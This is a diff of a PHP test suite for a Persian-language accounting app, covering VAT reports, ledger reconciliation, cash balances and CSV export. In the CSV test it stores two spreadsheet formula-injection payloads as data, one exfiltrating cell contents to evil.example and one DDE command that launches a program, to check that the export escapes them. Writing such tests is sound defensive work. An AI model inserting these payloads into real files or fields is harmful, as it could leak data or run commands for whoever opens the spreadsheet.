@@ -26,6 +26,7 @@ require_once __DIR__ . '/../includes/user_data.php';
 require_once __DIR__ . '/../includes/biz_catalog.php';
 require_once __DIR__ . '/../includes/biz_docs.php';
 require_once __DIR__ . '/../includes/biz_acc.php';
+require_once __DIR__ . '/../includes/biz_dash.php';
 require_once __DIR__ . '/../includes/biz_docview.php';
 
 const APREFIX = '__bacc_';
@@ -139,7 +140,8 @@ T::same(10.0, (float)$si['vat_rate'], 'نرخِ سند از فروشگاه عک�
 T::same((int)$si['total'], $partyBal($u, $CUST), 'مانده‌ی مشتری با مالیات');
 $sales = BizReports::sales($u, BizReports::ALL_FROM, BizReports::ALL_TO);
 T::same($net, $sales['net'], '⛔ فروشِ گزارش بی‌مالیات است (مالیات درآمد نیست)');
-$daily = array_sum(BizReports::daily($u, date('Y-m-d'), date('Y-m-d')));
+// همان سری‌ای که نمودارهای داشبورد از آن ساخته می‌شوند
+$daily = array_sum(array_column(BizDash::salesDaily($u, date('Y-m-d'), date('Y-m-d')), 'rev'));
 T::same($net, $daily, 'نمودارِ روزانه هم بی‌مالیات');
 
 // دریافتِ «کامل» = کلِ مبلغ با مالیات
@@ -195,6 +197,8 @@ $expSaleTax = (int)$si['tax_total'] + (int)$s2['tax_total'] + (int)$o3['tax_tota
 T::same($expSaleTax, $vr['sum']['sale_tax'], 'مالیاتِ فروش = فروش − برگشت از فروش');
 T::same(1000, $vr['sum']['buy_tax'], 'مالیاتِ خرید (اعتبار)');
 T::same($expSaleTax - 1000, $vr['sum']['payable'], '⛔ بدهی به سازمان = مالیاتِ فروش − مالیاتِ خرید');
+// ⛔ «معاف» از ردیف‌ها: فاکتورِ ۱ مختلط است (مشمول + معاف) و هیچ فاکتورِ تمام‌معافی نیست
+T::same((int)$si['lines'][1]['net_total'], $vr['sum']['exempt'], '⛔ ردیفِ معافِ فاکتورِ مختلط در «فروشِ معاف» شمرده می‌شود');
 T::same($sales['net'] + (2000) + 0, $vr['sum']['sale_net'], 'فروشِ بی‌مالیاتِ گزارش (فاکتورِ ۳ کاملاً برگشت خورد)');
 [$qf, $qt] = BizVat::quarter(1405, 3);
 T::same(['2026-09-23', '2026-12-21'], [$qf, $qt], 'فصلِ سومِ ۱۴۰۵ = مهر تا آذر');
@@ -414,6 +418,47 @@ T::ok(str_starts_with($csv, "\xEF\xBB\xBF") && substr_count($csv, "\n") > count(
 $jr = BizLedger::entries($u, date('Y-m-d'), date('Y-m-d'));
 T::ok(!array_filter($jr, fn($e) => $e['date'] !== date('Y-m-d')), 'روزنامه‌ی یک بازه فقط سندهای همان بازه');
 T::same([], BizLedger::entries($v, BizReports::ALL_TO), '⛔ دفترِ فروشگاهِ دیگر هیچ سطری از این فروشگاه ندارد');
+
+// =================================================================
+T::group('۳ب — بازبینیِ مهر ۱۴۰۵: مغایرتِ تاریخ‌دار، فرمول در CSV، نوع‌های پول');
+// ⛔ مغایرت‌گیری همیشه کلِ دفتر را می‌سنجد: ترازِ «تا دیروز» (یا امروز، کنارِ
+//    دریافتِ تاریخِ آینده) با مانده‌ی امروزِ صفحه‌ها مغایرتِ دروغ نشان می‌داد
+$q = $make('q');
+$QA = $acc($q);
+$QC = (int)BizParties::save($q, ['name' => '=HYPERLINK("http://evil.example/?x="&A1,"x")', 'kind' => 'customer'])['id'];
+BizPay::create($q, ['kind' => 'receipt', 'party_id' => $QC, 'amount' => '1000', 'account_id' => $QA, 'pay_date' => date('Y-m-d')]);
+$yday = date('Y-m-d', strtotime('-1 day'));
+$rq = BizLedger::reconcile($q, BizLedger::trial($q, $yday, '', BizLedger::entries($q, $yday)));
+T::ok($rq['ok'], '⛔ ترازنامه‌ی دیروز: بی‌مغایرتِ دروغ', json_encode($rq, JSON_UNESCAPED_UNICODE));
+BizPay::create($q, ['kind' => 'receipt', 'party_id' => $QC, 'amount' => '500', 'account_id' => $QA, 'pay_date' => date('Y-m-d', strtotime('+10 day'))]);
+$rq = BizLedger::reconcile($q, BizLedger::trial($q, date('Y-m-d')));
+T::ok($rq['ok'], '⛔ ترازنامه‌ی امروز با دریافتِ تاریخِ آینده: بی‌مغایرتِ دروغ', json_encode($rq, JSON_UNESCAPED_UNICODE));
+$qAll = BizLedger::entries($q, BizReports::ALL_TO);
+T::same(BizLedger::entries($q, date('Y-m-d')), BizLedger::upTo($qAll, date('Y-m-d')), '`upTo()` همان سندهای «تا آن روز» است (صفحه یک بار می‌سازد)');
+// ⛔ CSVِ روزنامه: نامِ طرف‌حساب و شرحِ هزینه متنِ کاربرند — فرمول در اکسل اجرا نشود
+BizPay::create($q, ['kind' => 'expense', 'title' => "=cmd|' /C calc'!A0", 'amount' => '10', 'account_id' => $QA, 'pay_date' => date('Y-m-d')]);
+$qcsv = BizLedger::csv(BizLedger::entries($q, BizReports::ALL_TO));
+$cells = [];
+foreach (array_slice(explode("\n", trim($qcsv)), 1) as $ln) { foreach (str_getcsv($ln, ',', '"', '') as $c) { $cells[] = $c; } }
+T::same([], array_values(array_filter($cells, fn($c) => $c !== '' && strpbrk($c[0], '=+@') !== false)), '⛔ هیچ سلولی با = + @ شروع نمی‌شود (فرمولِ تزریقی)');
+T::ok(in_array("'=HYPERLINK(\"http://evil.example/?x=\"&A1,\"x\")", $cells, true), 'نامِ طرف‌حساب با «\'» متن ماند، نه حذف', mb_substr($qcsv, 0, 400));
+T::ok(in_array('1000', $cells, true), 'مبلغ عددِ خام می‌ماند (بی‌«\'»)');
+// ⛔ هر نوعِ دریافت/پرداخت دقیقاً در یکی از «پول می‌آید»، «پول می‌رود» یا انتقال
+$kinds = array_merge(BizPay::IN_KINDS, BizPay::OUT_KINDS, ['transfer']);
+sort($kinds);
+$all7 = array_keys(BizPay::KINDS);
+sort($all7);
+T::same($all7, $kinds, '⛔ `IN_KINDS` + `OUT_KINDS` + انتقال = همه‌ی نوع‌ها، بی‌تکرار');
+// ⛔ و مانده‌ی صندوق، مانده‌ی تاریخ‌دار (شمارش) و جمعِ فهرست همه از همان دو فهرست
+$capQ = BizPay::create($q, ['kind' => 'capital', 'amount' => '70', 'account_id' => $QA, 'pay_date' => $yday]);
+T::ok($capQ['ok'], 'آورده‌ی دیروز', $capQ['message']);
+BizPay::create($q, ['kind' => 'drawing', 'amount' => '5', 'account_id' => $QA, 'pay_date' => date('Y-m-d')]);
+$book = (int)array_column(BizCash::list($q), 'balance', 'id')[$QA];
+T::same(1000 + 500 - 10 + 70 - 5, $book, 'موجودیِ صندوق (`balanceSql()`)');
+T::same($book, BizCashCount::balanceAt($pdo, $q, $QA, BizReports::ALL_TO), '⛔ مانده‌ی تاریخ‌دار همان سازنده است');
+T::same(70, BizCashCount::balanceAt($pdo, $q, $QA, $yday), 'مانده‌ی تا دیروز فقط آورده‌ی دیروز');
+$ql = BizPay::list($q);
+T::same([1570, 15], [$ql['in'], $ql['out']], 'جمعِ ورود و خروجِ فهرست از همان دو فهرست');
 
 // =================================================================
 T::group('۶ — بستنِ سالِ مالی');
